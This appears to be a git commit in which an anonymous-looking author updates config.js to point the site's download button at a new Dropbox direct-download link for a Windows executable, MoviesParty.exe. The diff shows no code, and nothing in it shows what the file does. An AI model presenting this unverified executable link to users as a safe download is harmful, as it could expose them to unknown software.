912d9b173949e4429faaf2e0b160daf04c4329c9
asdqwefz <crownesxdd@gmail.com>
2026-06-02 13:36:59 +0300

    Update config.js

--- config.js
+++ config.js
@@ -1,1 +1,1 @@
-window.DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/z65jintvrrbe13ud9zmcv/MoviesParty.exe?rlkey=p8v2okio7isiigkm67755drbf&st=qyudwbri&dl=1';
+window.DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/zm127s4o4vkuulsdazgwj/MoviesParty.exe?rlkey=flxov6azn3wbtrr0c27v1yayi&st=21tlf7h6&dl=1';
